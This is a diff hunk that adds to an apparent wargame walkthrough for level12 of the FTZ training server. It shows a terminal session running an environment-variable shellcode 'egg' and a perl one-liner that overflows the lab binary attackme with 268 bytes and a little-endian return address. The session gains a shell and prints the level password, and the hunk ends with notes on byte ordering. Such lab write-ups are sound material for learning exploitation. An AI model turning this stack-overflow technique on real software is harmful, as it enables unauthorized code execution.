@@ -185,3 +185,24 @@ main() {
 [level12@ftz tmp]$ gcc getegg.c -o getegg
 ```
 
+```
+[level12@ftz tmp]$ ./egg 459
+Using address: 0xbfffe8b8
+
+sh-2.05b$ ./getegg
+EGG : 0xbffff69c
+
+sh-2.05b$ (perl -e 'print "A"x268,"\x9c\xf6\xff\xbf"';cat) | /home/level12/attackme
+
+sh-2.05b$ id
+uid=3092(level12) gid=3092(level12) groups=3092(level12)
+
+sh-2.05b$ my-pass
+Level12 Password is "it is like this".
+
+```
+
+0xbffff69c   
+bf ff f6 9c   
+9c f6 ff bf   
+\x9c\xf6\xff\xbf
